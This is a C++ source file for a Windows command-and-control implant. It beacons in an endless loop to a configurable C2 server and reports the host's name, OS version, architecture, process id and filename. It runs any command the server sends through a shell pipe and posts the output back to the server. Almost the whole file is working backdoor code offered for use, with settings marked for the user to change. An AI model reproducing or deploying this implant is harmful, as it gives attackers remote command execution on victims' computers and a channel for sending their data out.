#include <cctype>			// URL encoding
#include <iomanip>			// URL encoding
#include <sstream>			// URL encoding
#include <string>			// URL encoding
#include "stdafx.h"			// WinHttpClient
#include "WinHttpClient.h"	// WinHttpClient
#include <Psapi.h>			// GetModuleBaseName()
#include <iostream>
#include <string>
#include <Windows.h>

using namespace std;

// Start of function prototypes
wstring GetProcessFilename();
wstring GetHostname();
wstring Get32BitOS();
wstring Get64BitOS();
wstring GetArchitecture();
string UTF8Encode(const wstring &PostData);
string URLEncode(const string &Value);
wstring Beacon(const wstring &BeaconURL, const wstring &UserAgent);
wstring ExtractString(const wstring Source, const wstring Start, const wstring End);
wstring ExecuteCommand(const wstring &BeaconResponse);
void CommandUpdate(const wstring &UpdateURL, const wstring &UserAgent, const wstring &CommandOutput, const wstring &Id, const wstring &Action, const wstring &Secondary);
// End of function prototypes

#pragma comment(lib, "Psapi.lib") // GetModuleBaseName()

int main()
{
	wstring BeaconURL = L"http://192.168.1.135/beacon.php"; // **** Needs changed by user ****
	wstring UpdateURL = L"http://192.168.1.135/update.php"; // **** Needs changed by user ****
	wstring UserAgent = L"Test";							// **** Needs changed by user ****
	int BeaconInterval = 10000;								// **** Needs changed by user ****

	// Infinite loop
	while (true)
	{
		wstring BeaconResponse = Beacon(BeaconURL, UserAgent); // Beacons and stores response in "BeaconResponse"

		// Code modified from http://stackoverflow.com/questions/2340281/check-if-a-string-contains-a-string-in-c
		// If BeaconResponse contains a tasked command
		if (BeaconResponse.find(L"<action>command</action>") != wstring::npos)
		{
			// Parses task information
			wstring Id = ExtractString(BeaconResponse, L"<id>", L"</id>");
			wstring Action = ExtractString(BeaconResponse, L"<action>", L"</action>");
			wstring Secondary = ExtractString(BeaconResponse, L"<secondary>", L"</secondary>");
			
			wstring CommandOutput = ExecuteCommand(Secondary); // Executes tasked command and saves output in "CommandOutput" variable

			CommandUpdate(UpdateURL, UserAgent, CommandOutput, Id, Action, Secondary); // Updates command output to C2 server
		}

		// If statement to determine if BeaconResponse contains <action>upload</action> here

		// If statement to determine if BeaconResponse contains <action>download</action> here

		Sleep(BeaconInterval);
	}

	return 0;
}
// End of main() function


// Gets the current proccess' filename
// Returns "ProcessFilename" wstring
wstring GetProcessFilename()
{
	HANDLE hProcess = GetCurrentProcess(); // Gets handle to current process

	wchar_t Filename[MAX_PATH]; // 260 characters
	GetModuleBaseName(hProcess, NULL, Filename, MAX_PATH); // Returns just the process filename from the handle

	wstring ProcessFilename = Filename; // Convert to wstring
	return ProcessFilename;
}
// End of GetProcessFileName() function


// Gets the system hostname
// Returns "Hostname" wstring
wstring GetHostname()
{
	wchar_t Buffer[MAX_COMPUTERNAME_LENGTH + 1]; // MAX_COMPUTERNAME_LENGTH + 1 per MSDN
	DWORD Size;
	GetComputerName(Buffer, &Size); // Gets the NetBIOS name of the local computer

	wstring Hostname = Buffer; // Converts to wstring
	return Hostname;
}
// End of GetHostname() function


// Gets the system OS for x86 systems
// Returns "OperatingSystem" wstring
wstring Get32BitOS()
{
	HKEY hRegistry = NULL;
	RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", &hRegistry); // Opens a handle to the Registry

	DWORD Size;
	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, NULL, &Size); // Queries the size (in bytes) for the "ProductName" Registry key - Will save size (in bytes) including null-terminator in "size" DWORD

	wchar_t Buffer[256];
	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, (LPBYTE)&Buffer, &Size); // Queries the "ProductName" Registry key and stores output in buffer

	RegCloseKey(hRegistry); // Closes the Registry handle

	wstring OperatingSystem = Buffer; // Converts to wstring
	return OperatingSystem;
}
// End of Get32BitOS() function


// Gets the system OS for x64 systems
// Returns "OperatingSystem" wstring
wstring Get64BitOS()
{
	HKEY hRegistry = NULL;
	RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion", &hRegistry); // Opens a handle to the Registry

	DWORD Size;
	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, NULL, &Size); // Queries the size (in bytes) for the "ProductName" Registry key - Will save size (in bytes) including null-terminator in "size" DWORD

	wchar_t Buffer[256];
	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, (LPBYTE)&Buffer, &Size); // Queries the "ProductName" Registry key and stores output in buffer

	RegCloseKey(hRegistry); // Closes the Registry handle

	wstring OperatingSystem = Buffer; // Converts to wstring
	return OperatingSystem;
}
// End of Get64BitOS() function


// Gets the system architecture - DOES NOT TAKE INTO ACCOUNT NON C: SYSTEM DRIVES (IE: OTHER DRIVE LETTERS)
// Returns "Architecture" wstring
wstring GetArchitecture()
{
	wstring Architecture;
	BOOL Exists = PathFileExists(L"C:\\Windows\\SysWOW64"); // Determines if C:\Windows\SysWOW64 directory exists

	if (Exists == TRUE) // If true then the system architecture is x64
		Architecture = L"x64";
	else // Else the system architecture is x86
		Architecture = L"x86";

	return Architecture;
}
// End of GetArchitecture() function


// Obtained from http://stackoverflow.com/questions/36774547/httpsendrequest-post-data-not-supporting-unicode
// Used to convert POST data from UTF-16 (wstring) to UTF-8 (string)
// Returns UTF-8 "Output" string
string UTF8Encode(const wstring &PostData)
{
	string Output;
	int len = WideCharToMultiByte(CP_UTF8, 0, PostData.c_str(), PostData.length(), NULL, 0, NULL, NULL);
	if (len > 0)
	{
		Output.resize(len);
		WideCharToMultiByte(CP_UTF8, 0, PostData.c_str(), PostData.length(), &Output[0], len, NULL, NULL);
	}
	return Output; // Returns UTF-8 string to the calling function
}
// End of UTF8Encode() function


// Code obtained from http://stackoverflow.com/questions/154536/encode-decode-urls-in-c
// Returns URL-encded string "Escaped"
string URLEncode(const string &Value) {
	ostringstream Escaped;
	Escaped.fill('0');
	Escaped << hex;

	for (string::const_iterator i = Value.begin(), n = Value.end(); i != n; ++i)
	{
		string::value_type c = (*i);

		// Keep alphanumeric and other accepted characters intact
		if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
			Escaped << c;
			continue;
		}

		// Any other characters are percent-encoded
		Escaped << uppercase;
		Escaped << '%' << setw(2) << int((unsigned char)c);
		Escaped << nouppercase;
	}

	return Escaped.str();
}
// End of URLEncode() function


// Beacons to the specified C2 server
// Returns "Response" wstring
wstring Beacon(const wstring &BeaconURL, const wstring &UserAgent)
{
	WinHttpClient Beacon(BeaconURL);
	Beacon.SetUserAgent(UserAgent);
	Beacon.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER

	string PostData;

	if (GetArchitecture() == L"x86") // If system architecture is x86 so we need to call the 32-bit version of getOS()
		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get32BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&pid=" + to_string(GetCurrentProcessId()) + "&pfilename=" + URLEncode(UTF8Encode(GetProcessFilename())); // POST data
	else // Else system architecture is x64 so we need to call the 64-bit version of getOS()
		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get64BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&pid=" + to_string(GetCurrentProcessId()) + "&pfilename=" + URLEncode(UTF8Encode(GetProcessFilename())); // POST data

	Beacon.SetAdditionalDataToSend((BYTE *)PostData.c_str(), PostData.size());
	wstring ContentLength = to_wstring(PostData.length()); // We need to create new wstring for the "Content-Length" so we can append to the other headers

	wstring Headers = L"Content-Length: ";
	Headers += ContentLength;
	Headers += L"\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
	Beacon.SetAdditionalRequestHeaders(Headers); // Appends headers above

	Beacon.SendHttpRequest(L"POST"); // Sends the POST request

	wstring Response = Beacon.GetResponseContent(); // Gets POST respone and stores in "response" wstring

	return Response;
}
// End of Beacon() function


// Code modified from http://blog.mrroa.com/2013/06/06/tiptrick-how-to-retrieve-a-sub-string-between-two-delimiters-using-c/
// Extracts task information
// IE: Calling ExtractString(BeaconResponse, L"<id>", L"</id>"); will return the task ID
// Returns "Stripped" wstring
wstring ExtractString(const wstring Source, const wstring Start, const wstring End)
{
	wstring EmptyString;
	size_t StartIndex = Source.find(Start);

	// If the starting delimiter is not found - Exits function
	if (StartIndex == string::npos)
		return EmptyString;

	// Adds the length of the delimiter to our starting index
	// This will move us to the beginning of our substring.
	StartIndex += Start.length();

	// Looks for the end delimiter
	wstring::size_type EndIndex = Source.find(End, StartIndex);

	// Returns the substring between the start index and the end index
	wstring Stripped = Source.substr(StartIndex, EndIndex - StartIndex);
	return Stripped;
}

// End of ExtractString() function


// Code modified from http://www.cplusplus.com/forum/unices/28134/
// Runs the tasked command usng popen() and gets the output
// Returns "output" wstring
wstring ExecuteCommand(const wstring &Secondary)
{
	wstring Temp = L" 2>&1"; // Necessary to redirect Standard Error to Standard Output
	wstring Command = Secondary.data() + Temp; // Janky but this is necessary

	wchar_t Buffer[256];
	wstring Output;

	FILE* pipe = _wpopen(Command.data(), L"r");

	while (!feof(pipe))
	{
		if (fgetws(Buffer, 256, pipe) != NULL)
		{
			Output += Buffer;
		}

	}

	_pclose(pipe); // Closes pipe

	return Output;
}
// End of ExecuteCommand() function


// Updates task output to the specified C2 server
// Doesn't return anything
void CommandUpdate(const wstring &UpdateURL, const wstring &UserAgent, const wstring &CommandOutput, const wstring &Id, const wstring &Action, const wstring &Secondary)
{
	WinHttpClient Update(UpdateURL);
	Update.SetUserAgent(UserAgent);
	Update.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER

	string PostData;

	if (GetArchitecture() == L"x86") // If system architecture is x86 so we need to call the 32-bit version of getOS()
		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get32BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&id=" + UTF8Encode(Id) + "&action=" + UTF8Encode(Action) + "&secondary=" + URLEncode(UTF8Encode(Secondary)) + "&output=" + URLEncode(UTF8Encode(CommandOutput)); // POST data
	else // Else system architecture is x64 so we need to call the 64-bit version of getOS()
		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get64BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&id=" + UTF8Encode(Id) + "&action=" + UTF8Encode(Action) + "&secondary=" + URLEncode(UTF8Encode(Secondary)) + +"&output=" + URLEncode(UTF8Encode(CommandOutput)); // POST data

	Update.SetAdditionalDataToSend((BYTE *)PostData.c_str(), PostData.size());
	wstring ContentLength = to_wstring(PostData.length()); // We need to create new wstring for the "Content-Length" so we can append to the other headers

	wstring Headers = L"Content-Length: ";
	Headers += ContentLength;
	Headers += L"\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
	Update.SetAdditionalRequestHeaders(Headers); // Appends headers above

	Update.SendHttpRequest(L"POST"); // Sends the POST request
}
// End of Update() function
